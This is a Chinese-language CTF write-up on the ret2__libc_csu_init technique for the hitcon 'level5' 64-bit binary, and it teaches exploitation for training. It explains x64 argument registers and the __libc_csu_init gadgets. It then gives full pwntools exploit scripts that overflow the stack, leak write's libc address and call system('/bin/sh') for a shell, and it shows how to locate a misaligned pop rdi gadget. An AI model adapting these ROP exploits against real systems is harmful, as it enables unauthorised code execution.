> 示例文件：[https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5)
>
> 参考资料：[https://cloud.tencent.com/developer/article/1345756](https://cloud.tencent.com/developer/article/1345756)
>
> [https://blog.csdn.net/king_cpp_py/article/details/79483152](https://blog.csdn.net/king_cpp_py/article/details/79483152)
>
> [https://www.yuque.com/u239977/cbzkn3/vty6x0](https://www.yuque.com/u239977/cbzkn3/vty6x0)
>



> **<font style="color:#F5222D;">感谢大佬@</font>****<font style="color:#F5222D;">ILIB的帮助</font>**
>

首先说一下64位文件的传参方式：

当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。

当参数为7个以上时， 前 6 个与前面一样， 但后面的依次 放入栈中，即和32位程序一样

```plain
比如：参数个数大于 7 个的时候
H(a, b, c, d, e, f, g, h);
a->%rdi, b->%rsi, c->%rdx, d->%rcx, e->%r8, f->%r9
h->(%esp)
g->(%esp)
call H
```

接下来介绍一下ret2__libc_csu_init的利用原理：

在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。**<font style="color:#F5222D;">这</font>****<font style="color:#F5222D;">个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</font>**

**<font style="color:#000000;">示例：</font>**

我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)，将程序扔到IDA中，其汇编代码如下：

```c
.text:00000000004005C0
.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================
.text:00000000004005C0
.text:00000000004005C0
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005C0 ; __unwind {
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; } // starts at 4005C0
.text:0000000000400624 __libc_csu_init endp
.text:0000000000400624
.text:0000000000400624 ; ---------------------------------------------------------------------------
```

这里我们可以利用以下几点：

从 0x000000000040061A 一直到结尾，我们可以**<font style="color:#F5222D;">利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据</font>**（因为都是向寄存器进行pop）。对应的汇编如下：

```c
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 ; } // starts at 4005C0
.text:0000000000400624 __libc_csu_init endp
```

从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），**所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位****），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器（rdx、rsi、edi）**。**<font style="color:#F5222D;">此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。</font>**<u>比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址</u>。对应的汇编如下：

```c
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
```

从 0x000000000040060D 到 0x0000000000400614，**我们可以控制 rbx 与 rbp 的之间的关系为rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序**。这里我们可以简单的设置rbx=0，rbp=1。对应的汇编代码如下：

```c
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
```

开始做题，看一下文件的基本信息和保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597053183506-007b223b-207f-4f86-91fb-c80e6d4ce1b5.png)

64位程序，开了NX保护，main函数如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597054361318-7c049732-4588-44c7-b582-0f021ca85e19.png)

进入vulnerable_function函数：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597054427430-80c90b05-8327-45c3-b0ce-6f5ceeaeaccf.png)

发现一个read函数，这是一个简单的栈溢出函数

> ssize_t read(int fd,void*buf,size_t count)
>
> 参数说明：
>
> fd: 是文件描述符
>
> buf:为读出数据的缓冲区；
>
> count:为每次读取的字节数（是请求读取的字节数，读上来的数据保<font style="background-color:transparent;">存在缓冲区buf中，同时文件的当前读写位置向后移）</font>
>
> 成功：返回读出的字节数
>
> 失败：返回-1，并设置errno，如果在调用read
>
>           之前到达文件末尾，则这次read返回0
>

首先在IDA里看一下read函数的栈偏移（覆盖返回地址）：0x88，为了防止IDA不准确导致错误，因此手动测量一下：

利用cyclic工具生成不规则字符串（仔细看挺规则的）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597054848444-aca6a590-a4cf-4332-8643-d0ac775061a0.png)

gdb-peda开始调试，执行如下操作：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597055007480-28787bf2-8f8f-4c0c-8f63-956df53c6f72.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597055075767-31683792-919e-409b-8df7-69444e42c066.png)

利用rsp寄存器找偏移：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597055209428-3be6d636-7d23-4a74-84f5-962f02009870.png)

> (gdb) x /wx $rsp    # 以16进制显示指定rsp寄存器中的数据
>

栈偏移为136，与IDA测的0x88相等，呀，这次IDA测得挺准的，2333~

从IDA里可以看到，没有system函数，但有一个已知的write函数，我们可以利用这个函数并利用libc泄露出程序加载到内存后的地址（<font style="color:#333333;">当然也可以选用__libc_start_main</font>）。

首先寻找write函数在内存中的真实地址：

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload0 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
p.sendline(payload0)

write_start = u64(p.recv(8))
print "write_addr_in_memory_is "+hex(write_start)
```

重点解释一下这里的payload0：

> payload0 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
>

首先输入136个字符使程序发生栈溢出，然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去，之后将pop函数的返回地址覆盖mov_addr的地址为，如下：

> 注意：payload发送的内容都在栈上或堆上，这得看你的变量在栈上还是堆上，具体情况具体分析
>

```c
.text:000000000040061A                 pop     rbx  //rbx->0
.text:000000000040061B                 pop     rbp  //rbp->1
.text:000000000040061C                 pop     r12  //r12->write_got函数地址
.text:000000000040061E                 pop     r13  //r13->8
.text:0000000000400620                 pop     r14  //r14->write_got函数地址
.text:0000000000400622                 pop     r15  //r15->1
.text:0000000000400624                 retn         //覆盖为mov_addr
```

> 解释一下payload中两个write_got函数的作用：
>
> 再布置完寄存器后，由于有 call qword ptr [r12+rbx*8]它调用了write函数，其参数为write_got函数地址（r14寄存器，动调一下就知道了），写成C语言类似于：write(write_got函数地址)==printf（write_got函数地址），再使用u64(p.recv(8))接受数据并print出来就行了
>

之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi

```c
.text:0000000000400600                 mov     rdx, r13  //rdx==r13==8
.text:0000000000400603                 mov     rsi, r14  //rsi==r14==write_got函数地址
.text:0000000000400606                 mov     edi, r15d //edi==r15d==1
.text:0000000000400609                 call    qword ptr [r12+rbx*8] //call write_got函数地址 
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp //rbx==1,rbp==1
.text:0000000000400614                 jnz     short loc_400600
```

> JNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移。
>

这里rbx和rbp都等于1，他们相等，所以继续执行payload代码（main_addr）,而不是去执行loc_400600

> 从整体上来看，我们输入了  'A'*136，利用payload0对寄存器布局之后又重新回到了main函数
>
> 再说说'a'*(0x8+8*6)的作用：它的作用就是为了平衡堆栈
>
> 也就是说，当mov_addr执行完之后，按照流程仍然会执行地址400616处的函数，我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充），如下图所示：
>
> ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597125587373-dea568b1-820b-4230-bbde-056fb8a05ded.png)
>
> 用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容
>

第一部分的exp如下：

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload0 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
p.sendline(payload0)

write_start = u64(p.recv(8))
print "write_addr_in_memory_is "+hex(write_start)
```

> 这道题目我们使用系统中自带的libc.so.6文件
>
> 请注意：当程序加载的时候会寻找同目录下的libc.so.6文件，如果存在，则会自动加载，而不会去加载系统自带的libc文件
>

这样，我们就获得了write函数真实地址。

```python
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('libc.so.6')
libc_base=write_start-libc.symbols['write']
system_addr=libc.symbols['system']+libc_base
binsh=next(libc.search('/bin/sh'))+libc_base

print "libc_base_addr_in_memory_is "+hex(libc_base)
print "system_addr_in_memory_is "+hex(system_addr)
print "/bin/sh_addr_in_memory_is "+hex(binsh)

pop_rdi_ret=0x400623
payload='a'*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)

p.send(payload)

p.interactive()
```

当我们获得write函数的真实地址之后，就可以计算出libc文件的基址，从而可以计算出system函数和/bin/sh字符串在内存中的地址，从而利用它。

接下来解释一下第二个payload的意思：

> payload='a'*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)
>

当程序重新执行到main函数时，我们利用栈溢出让返回地址被pop_rdi_ret覆盖，从而程序执行pop_rdi_ret。

> 请注意，当我们send payload之后，pop_rdi_ret、binsh和system_addr被送到了栈中，利用gadgets：pop rdi;ret 将栈中的binsh地址送往rdi寄存器中（也就是说pop_rdi_ret的参数是地址binsh），然后将system函数地址覆盖到ret，程序就会执行此system函数。
>
> 当system函数执行的时候会利用到rdi里的参数，动态调试一下就知道了。
>

完整的exp如下：

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a          
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload0 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
p.sendline(payload0)

write_start = u64(p.recv(8))
print "write_addr_in_memory_is "+hex(write_start)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('libc.so.6')
libc_base=write_start-libc.symbols['write']
system_addr=libc.symbols['system']+libc_base
binsh=next(libc.search('/bin/sh'))+libc_base

print "libc_base_addr_in_memory_is "+hex(libc_base)
print "system_addr_in_memory_is "+hex(system_addr)
print "/bin/sh_addr_in_memory_is "+hex(binsh)

pop_rdi_ret=0x400623
payload='a'*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)

p.send(payload)

p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597126888175-50a79803-9a61-4bea-8bce-17ee825d022e.png)

getshell

但你是否注意到了pop_rdi_ret的地址0x400623在IDA中不存在？

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597121195240-cdbb68cc-8124-4077-a359-d0220c1403c4.png)

我们先来看一下csu_init的结尾几个pop的机器码：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597121458348-cb0364b6-0459-4810-b291-492d5c6d2163.png)

pop rbx--------->5B

pop rbp--------->5D

pop r12---------->41 5C

pop r13---------->41 5D

pop r14---------->41 5E

pop r15---------->41 5F

是不是感觉很有规律？

机器码就是有规律的，而这个规律我们在这可以巧妙地利用起来

查手册（或者IDA之类的改一下机器码）得到5F是pop rdi

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597121560710-3c122b7d-bc44-4372-aa3b-f7d358e5866e.png)

那么看上面最后：0x400622 pop r15---------->41 5F

如果我们+1，就会变成：0x400623 pop rdi---------->5F

也就是说这些东西（gadgets）是可以凑出来的，我们可以使用工具来看一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597121810024-76abeafb-e461-435d-a784-6ba1b248f51e.png)

